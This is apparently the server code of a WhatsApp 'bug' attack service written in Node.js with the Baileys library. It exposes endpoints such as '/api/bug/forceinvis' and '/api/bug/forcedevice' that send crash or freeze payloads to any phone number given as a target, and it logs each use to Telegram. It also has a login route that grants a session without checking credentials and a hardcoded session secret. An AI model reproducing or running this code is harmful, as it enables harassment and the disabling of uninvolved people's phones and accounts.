console.clear();  
require('./public/settings/config')
console.log('starting...');  
process.on("uncaughtException", console.error);  
  
const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap   
} = require("@whiskeysockets/baileys");  
  
const pino = require('pino');  
const readline = require("readline");
const https = require('https');
const fs = require('fs');  
const express = require("express");  
const bodyParser = require('body-parser');  
const cors = require("cors");  
const path = require("path");    
  
const app = express();
const session = require('express-session');
const PORT = process.env.PORT || 5036

const { GITHUB_TOKEN, REPO_OWNER, REPO_NAME, FILE_PATH } = require("./settings/config");
const {
  Octokit
} = require("@octokit/rest");
const octokit = new Octokit({
  auth: GITHUB_TOKEN
});

const { locaepheflow, opuswebp, freezeLogoTest, locationfc, locameral, CrlSqL, ControlFlow2, TripXMed2 } = require('./public/service/bugs')
const { getRequest, sendTele } = require('./public/engine/telegram')

app.enable("trust proxy");  
app.set("json spaces", 2);  
app.use(cors());  
app.use(express.urlencoded({   
  extended: true   
}));  
app.use(express.json());  
app.use(express.static(path.join(__dirname, "public")));  
app.use(bodyParser.raw({   
  limit: '50mb',   
  type: '*/*'   
}));  

const { Boom } = require('@hapi/boom');
const usePairingCode = true;  

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,   
        output: process.stdout   
    })
    return new Promise((resolve) => {  
        rl.question(text, resolve)   
    });  
}

const sslOptions = {
  key: fs.readFileSync('/etc/letsencrypt/live/xsaturns-api-dxyvxz.ibnuaryadi.my.id/privkey.pem'),
  cert: fs.readFileSync('/etc/letsencrypt/live/xsaturns-api-dxyvxz.ibnuaryadi.my.id/fullchain.pem')
};

app.use(session({
  secret: 'secret-key', // Ganti dengan secret yang lebih aman
  resave: false,
  saveUninitialized: false, // Ubah menjadi false untuk keamanan
  cookie: {
    secure: process.env.NODE_ENV === 'production', // true untuk HTTPS, false untuk lokal
    maxAge: 24 * 60 * 60 * 1000 // Cookie berlaku 24 jam
  }
}));

// Fungsi middleware untuk memeriksa login
const isLoggedIn = (req, res, next) => {
  if (req.session.loggedIn) {
    next();
  } else {
    res.redirect('/login');
  }
};

async function clientstart() {
	const { state, saveCreds } = await useMultiFileAuthState(`./session`)
    const { version, isLatest } = await fetchLatestBaileysVersion();
    const client = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.00"]
    });
      
    if (!client.authState.creds.registered) {
        const phoneNumber = await question('please enter your WhatsApp number, starting with 62:\n> ');  
        const code = await client.requestPairingCode(phoneNumber, "KIUU1234");  
        console.log(`your pairing code: ${code}`);  
    }

    app.get('/api/bug/forceinvis', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false, 
            message: "parameter target diperlukan"
        });
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")
        
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await locaepheflow(client, cuki)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent forceinvis to number ${cuki}`)
        const penis = `\n[API HIT]
        
Endpoint: Forceinvis
Target: ${target}
IP: ${info.ip}
Method: ${info.method}

this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable

${info.timestamp}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });  
    
    app.get('/api/bug/delayinvis', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false,  
            message: "parameter target diperlukan"
        });
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")
        
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await opuswebp(client, cuki)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent delayinvis to number ${cuki}`)
        const penis = `\n[API HIT]
        
Endpoint: Delayinvis
Target: ${target}
IP: ${info.ip}
Method: ${info.method}

this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable

${info.timestamp}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });
    
    app.get('/api/bug/forcedevice', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false,  
            message: "parameter target diperlukan"
        });
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")
        
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await freezeLogoTest(client, cuki)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent forcedevice to number ${cuki}`)
        const penis = `\n[API HIT]
        
Endpoint: forcedevice
Target: ${target}
IP: ${info.ip}
Method: ${info.method}

this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable

${info.timestamp}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });
    
    app.get('/api/bug/locationfc', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false,  
            message: "parameter target diperlukan"
        });
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")
        
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await locationfc(client, cuki)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent locationfc to number ${cuki}`)
        const penis = `\n[API HIT]
        
Endpoint: locationfc
Target: ${target}
IP: ${info.ip}
Method: ${info.method}

this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable

${info.timestamp}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });
    
    app.get('/api/bug/locameral', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false,  
            message: "parameter target diperlukan"
        });
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")
        
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await locameral(client, cuki)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent locameral to number ${cuki}`)
        const penis = `\n[API HIT]
        
Endpoint: locameral
Target: ${target}
IP: ${info.ip}
Method: ${info.method}

this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable

${info.timestamp}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });
    
    app.get('/api/bug/crlsql', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false,  
            message: "parameter target diperlukan"
        });
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")
        
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await CrlSqL(client, cuki)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent CrlSqL to number ${cuki}`)
        const penis = `\n[API HIT]
        
Endpoint: CrlSqL
Target: ${target}
IP: ${info.ip}
Method: ${info.method}

this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable

${info.timestamp}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });
    
    app.get('/api/bug/tripxmed', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false,  
            message: "parameter target diperlukan"
        });
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")
        
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await TripXMed2(client, cuki, 5)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent CrlSqL to number ${cuki}`)
        const penis = `\n[API HIT]
        
Endpoint: TripXMed2
Target: ${target}
IP: ${info.ip}
Method: ${info.method}

this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable

${info.timestamp}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });
    
    app.get('/api/bug/controlflow', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false,  
            message: "parameter target diperlukan"
        });
        let bijipeler = target.replace(/[^0-9]/g, "")
        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!")
        
        let cuki = bijipeler + '@s.whatsapp.net'
        const info = await getRequest(req)
        try {
            await ControlFlow2(client, cuki, 5)
            res.json({
                status: true,
                creator: global.creator,
                result: "sukses"
            });
        console.log(`successfully sent CrlSqL to number ${cuki}`)
        const penis = `\n[API HIT]
        
Endpoint: ControlFlow2
Target: ${target}
IP: ${info.ip}
Method: ${info.method}

this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable

${info.timestamp}`
            sendTele(penis)
        } catch (error) {
            console.error(error);
            res.status(500).json({
                status: false,
                error: error.message
            });
        }
    });
   
    client.ev.on('connection.update', (update) => {
        const { konek } = require('./public/connection/connect')
        konek({ 
            client, 
            update, 
            clientstart,
            DisconnectReason,
            Boom
        })  
    })  
    
    client.ev.on('creds.update', saveCreds);  
    return client;
}
      
clientstart()

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/station', isLoggedIn, (req, res) => {
  try {
    res.sendFile(path.join(__dirname, 'main.html'));
  } catch (err) {
    console.error(err);
    res.status(500).send('Error');
  }
});

app.get('/api/fetch/dxy/db', async (req, res) => {
  try {
    const { username, password } = req.body;
    const ip = req.ip; // dapatkan IP address dari request
    const response = await octokit.repos.getContent({
      owner: REPO_OWNER,
      repo: REPO_NAME,
      path: FILE_PATH
    });
    const data = Buffer.from(response.data.content, 'base64').toString();
    const jsonData = JSON.parse(data);
    res.json(jsonData);
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Gagal memuat data' });
  }
});

app.get('/login', (req, res) => {
  try {
    res.sendFile(path.join(__dirname, 'login.html'));
  } catch (err) {
    console.error(err);
    res.status(500).send('Error');
  }
});

app.post('/login', (req, res) => {
  req.session.loggedIn = true;
  req.session.save((err) => {
    if (err) {
      console.error(err);
    } else {
      console.log('Session saved:', req.session);
      res.redirect('/station');
    }
  });
  res.redirect('/station');
});

/*app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
}).on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} is in use. Trying another port...`);
    const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024);
    app.listen(newPort, () => {
      console.log(`Server is running on http://localhost:${newPort}`);
    });
  } else {
    console.error('An error occurred:', err.message);
  }
});*/

https.createServer(sslOptions, app).listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
}).on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} is in use. Trying another port...`);
    const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024);
    app.listen(newPort, () => {
      console.log(`Server is running on http://localhost:${newPort}`);
    });
  } else {
    console.error('An error occurred:', err.message);
  }
});

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {  
  require('fs').unwatchFile(file)  
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')  
  delete require.cache[file]  
  require(file)  
})  